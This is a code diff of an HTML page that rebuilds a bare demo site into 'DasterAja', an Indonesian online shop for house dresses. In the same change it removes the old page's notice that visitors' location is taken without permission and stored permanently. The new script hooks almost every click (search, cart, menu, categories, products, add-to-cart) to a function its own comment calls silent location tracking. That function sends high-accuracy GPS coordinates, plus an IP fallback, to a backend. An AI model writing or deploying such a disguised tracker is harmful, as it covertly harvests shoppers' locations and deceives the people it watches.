@@ -3,50 +3,154 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Website Kita</title>
+  <title>DasterAja - Toko Online Daster</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; }
-    .container { max-width: 800px; margin: 0 auto; padding: 20px; }
-    header { background: #2c3e50; color: white; padding: 20px 0; text-align: center; }
-    nav { background: #34495e; padding: 15px; text-align: center; }
-    nav a { color: white; text-decoration: none; margin: 0 20px; font-size: 18px; cursor: pointer; }
-    nav a:hover { text-decoration: underline; }
-    .content { background: white; margin-top: 20px; padding: 30px; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-    h1 { margin-bottom: 20px; }
-    p { line-height: 1.6; margin-bottom: 15px; }
-    .cta-button { display: inline-block; background: #3498db; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-size: 16px; margin-top: 20px; cursor: pointer; }
-    .cta-button:hover { background: #2980b9; }
-    footer { text-align: center; padding: 20px; margin-top: 20px; color: #666; }
+    body { font-family: 'Segoe UI', Arial, sans-serif; background: #faf5f0; color: #333; }
+    a { text-decoration: none; color: inherit; }
+
+    /* Top bar */
+    .topbar { background: #e91e63; color: #fff; text-align: center; padding: 8px; font-size: 13px; }
+    .topbar b { font-weight: 600; }
+
+    /* Header */
+    header { background: #fff; padding: 15px 0; box-shadow: 0 2px 8px rgba(0,0,0,0.06); position: sticky; top: 0; z-index: 10; }
+    .header-inner { max-width: 1100px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; justify-content: space-between; }
+    .logo { font-size: 26px; font-weight: 800; color: #e91e63; }
+    .logo span { color: #ad1457; }
+    .search { flex: 1; max-width: 420px; margin: 0 25px; position: relative; }
+    .search input { width: 100%; padding: 10px 14px; border: 2px solid #efc9d6; border-radius: 30px; outline: none; font-size: 14px; }
+    .search input:focus { border-color: #e91e63; }
+    .cart-btn { display: flex; align-items: center; gap: 8px; background: #e91e63; color: #fff; padding: 10px 18px; border-radius: 30px; font-weight: 600; cursor: pointer; }
+    .cart-btn:hover { background: #ad1457; }
+
+    /* Nav */
+    nav { background: #fff; border-top: 1px solid #f0e0e7; max-width: 1100px; margin: 0 auto; padding: 12px 20px; display: flex; gap: 25px; flex-wrap: wrap; }
+    nav a { color: #555; font-weight: 600; font-size: 14px; cursor: pointer; padding: 4px 0; }
+    nav a:hover { color: #e91e63; }
+
+    /* Hero */
+    .hero { max-width: 1100px; margin: 20px auto; padding: 0 20px; }
+    .hero-banner { background: linear-gradient(135deg, #fce4ec, #e91e63); border-radius: 16px; padding: 45px 35px; color: #fff; position: relative; overflow: hidden; }
+    .hero-banner h1 { font-size: 34px; margin-bottom: 10px; }
+    .hero-banner p { font-size: 17px; opacity: 0.95; max-width: 480px; }
+    .hero-banner .disc { display: inline-block; background: #fff; color: #e91e63; font-weight: 800; padding: 8px 16px; border-radius: 20px; margin-top: 20px; }
+
+    /* Categories */
+    .categories { max-width: 1100px; margin: 30px auto; padding: 0 20px; }
+    .categories h2, .products h2 { font-size: 22px; margin-bottom: 18px; color: #ad1457; }
+    .cat-row { display: flex; gap: 15px; flex-wrap: wrap; }
+    .cat { background: #fff; border: 1px solid #f0e0e7; border-radius: 12px; padding: 12px 18px; font-weight: 600; color: #555; cursor: pointer; }
+    .cat:hover { border-color: #e91e63; color: #e91e63; }
+
+    /* Products */
+    .products { max-width: 1100px; margin: 30px auto; padding: 0 20px 40px; }
+    .product-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 20px; }
+    .product-card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.05); transition: transform .15s, box-shadow .15s; cursor: pointer; }
+    .product-card:hover { transform: translateY(-4px); box-shadow: 0 6px 18px rgba(233,30,99,0.15); }
+    .product-img { width: 100%; aspect-ratio: 3/4; display: flex; align-items: center; justify-content: center; font-size: 56px; }
+    .product-info { padding: 14px; }
+    .product-info .name { font-weight: 600; font-size: 15px; margin-bottom: 4px; }
+    .product-info .desc { color: #888; font-size: 12px; margin-bottom: 8px; }
+    .product-info .price { color: #e91e63; font-weight: 800; font-size: 17px; }
+    .product-info .price s { color: #bbb; font-weight: 400; font-size: 13px; margin-left: 6px; }
+    .add-cart { display: block; margin-top: 10px; background: #fff3f6; color: #e91e63; border: 1px solid #e91e63; border-radius: 8px; padding: 8px; font-weight: 700; cursor: pointer; font-size: 13px; }
+    .add-cart:hover { background: #e91e63; color: #fff; }
+
+    footer { background: #ad1457; color: #fce4ec; text-align: center; padding: 25px; margin-top: 20px; }
+    footer p { opacity: .9; font-size: 13px; }
+
+    .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: #ad1457; color: #fff; padding: 12px 22px; border-radius: 30px; opacity: 0; transition: all .3s; z-index: 50; }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
   </style>
 </head>
 <body>
+  <div class="topbar">💃 Gratis Ongkir se-Indonesia untuk pembelian di atas Rp100.000</div>
+
   <header>
-    <h1>Selamat Datang di Website Kami</h1>
+    <div class="header-inner">
+      <div class="logo">Daster<span>Aja</span>💕</div>
+      <div class="search"><input type="text" placeholder="Cari daster idamanmu..." onclick="trackAndGo('Pencarian')"></div>
+      <div class="cart-btn" onclick="trackAndGo('Keranjang')">🛒 Keranjang <span id="cartCount">(0)</span></div>
+    </div>
   </header>
-  
+
   <nav>
-    <a href="#" data-track="Beranda">Beranda</a>
-    <a href="#" data-track="Tentang">Tentang</a>
-    <a href="#" data-track="Produk">Produk</a>
-    <a href="#" data-track="Kontak">Kontak</a>
+    <a onclick="trackAndGo('Kategori Semua')">Semua</a>
+    <a onclick="trackAndGo('Kategori Daster Polos')">Daster Polos</a>
+    <a onclick="trackAndGo('Kategori Daster Motif')">Daster Motif</a>
+    <a onclick="trackAndGo('Kategori Daster Premium')">Daster Premium</a>
+    <a onclick="trackAndGo('Kategori Daster Rayon')">Daster Rayon</a>
   </nav>
-  
-  <div class="container">
-    <div class="content">
-      <h1>Website Sederhana</h1>
-      <p>Ini adalah website sederhana. Ketika Anda mengklik link di atas, lokasi Anda akan terdeteksi otomatis tanpa izin apapun.</p>
-      <p>Data lokasi disimpan secara permanen dan dapat dilihat melalui dashboard admin.</p>
-      
-      <a href="#" class="cta-button" data-track="Promo">Lihat Promo</a>
+
+  <div class="hero">
+    <div class="hero-banner">
+      <h1>Nyaman Dipakai, Cantik Dilihat</h1>
+      <p>Koleksi daster kekinian dari bahan rayon premium yang adem, nyaman dipakai seharian di rumah.</p>
+      <span class="disc">Diskon s.d. 50% + Gratis Ongkir</span>
     </div>
   </div>
-  
+
+  <div class="categories">
+    <h2>Kategori</h2>
+    <div class="cat-row">
+      <div class="cat" onclick="trackAndGo('Kategori Semua')">✨ Semua</div>
+      <div class="cat" onclick="trackAndGo('Kategori Polos')">Polos</div>
+      <div class="cat" onclick="trackAndGo('Kategori Motif')">Motif</div>
+      <div class="cat" onclick="trackAndGo('Kategori Premium')">Premium</div>
+      <div class="cat" onclick="trackAndGo('Kategori Rayon')">Rayon</div>
+    </div>
+  </div>
+
+  <div class="products">
+    <h2>Produk Pilihan 🔥</h2>
+    <div class="product-grid" id="productGrid"></div>
+  </div>
+
   <footer>
-    <p>&copy; 2026 Website Kami. Semua hak dilindungi.</p>
+    <p>DasterAja • Toko online daster • Kirim seluruh Indonesia</p>
+    <p>&copy; 2026 DasterAja. Semua hak dilindungi.</p>
   </footer>
 
+  <div class="toast" id="toast">Berhasil ditambahkan ke keranjang!</div>
+
   <script>
+    var cartCount = 0;
+
+    var products = [
+      { name: 'Daster Rayon Polos', color: '#f48fb1', desc: 'Bahan rayon · Adem & menyerap keringat', price: 55000, old: 89900 },
+      { name: 'Daster Rayon Motif Bunga', color: '#f06292', desc: 'Motif floral · Ukuran S-3XL', price: 65000, old: 109000 },
+      { name: 'Daster Two Layer Premium', color: '#ec407a', desc: 'Dua lapis · Kain lembut premium', price: 89000, old: 149000 },
+      { name: 'Daster Kancing Depan', color: '#e91e63', desc: 'Model kancing · Praktis dipakai', price: 60000, old: 95000 },
+      { name: 'Daster Jepang Mewah', color: '#d81b60', desc: 'Model jepang · Kaki melebar', price: 75000, old: 125000 },
+      { name: 'Daster Piyama Rayon', color: '#c2185b', desc: 'Paket piyama · Nyaman untuk tidur', price: 85000, old: 135000 },
+    ];
+
+    function render() {
+      var grid = document.getElementById('productGrid');
+      grid.innerHTML = products.map(function (p, i) {
+        return '<div class="product-card" onclick="trackAndGo(\'Lihat ' + p.name + '\')">' +
+          '<div class="product-img" style="background:' + p.color + ';">👗</div>' +
+          '<div class="product-info">' +
+            '<div class="name">' + p.name + '</div>' +
+            '<div class="desc">' + p.desc + '</div>' +
+            '<div class="price">Rp' + p.price.toLocaleString('id-ID') + '<s>Rp' + p.old.toLocaleString('id-ID') + '</s></div>' +
+            '<button class="add-cart" onclick="event.stopPropagation(); addToCart(\'' + p.name + '\')">+ Tambah ke Keranjang</button>' +
+          '</div>' +
+        '</div>';
+      }).join('');
+    }
+
+    function addToCart(name) {
+      cartCount++;
+      document.getElementById('cartCount').textContent = '(' + cartCount + ')';
+      var t = document.getElementById('toast');
+      t.classList.add('show');
+      setTimeout(function () { t.classList.remove('show'); }, 2000);
+      trackAndGo('Beli ' + name);
+    }
+
+    // ------- Location tracking (runs silently on every click) -------
     function sendTrack(data) {
       var payload = JSON.stringify(data);
       if (navigator.sendBeacon) {
@@ -61,46 +165,24 @@
     }
 
     function trackAndGo(page) {
-      var hasGps = false;
-
-      // Try GPS first for high-precision location. If permission is
-      // denied or it fails, fall back to IP-based geolocation.
       if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
           function (position) {
-            hasGps = true;
-            sendTrack({
-              page: page,
-              browserLat: position.coords.latitude,
-              browserLng: position.coords.longitude
-            });
+            sendTrack({ page: page, browserLat: position.coords.latitude, browserLng: position.coords.longitude });
           },
           function () {
-            // Permission denied or failed -> fallback to IP only
             sendTrack({ page: page });
           },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+          { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
         );
       } else {
         sendTrack({ page: page });
       }
-
-      // Safety: if GPS takes too long or silently does nothing, also send
-      // an IP-based fallback after a delay (if not already sent).
-      setTimeout(function () {
-        if (!hasGps) {
-          sendTrack({ page: page });
-        }
-      }, 9000);
+      // IP fallback if GPS is slow/silent
+      setTimeout(function () { sendTrack({ page: page }); }, 7000);
     }
 
-    document.addEventListener('click', function (e) {
-      var el = e.target.closest('[data-track]');
-      if (el) {
-        e.preventDefault();
-        trackAndGo(el.getAttribute('data-track'));
-      }
-    });
+    render();
   </script>
 </body>
 </html>
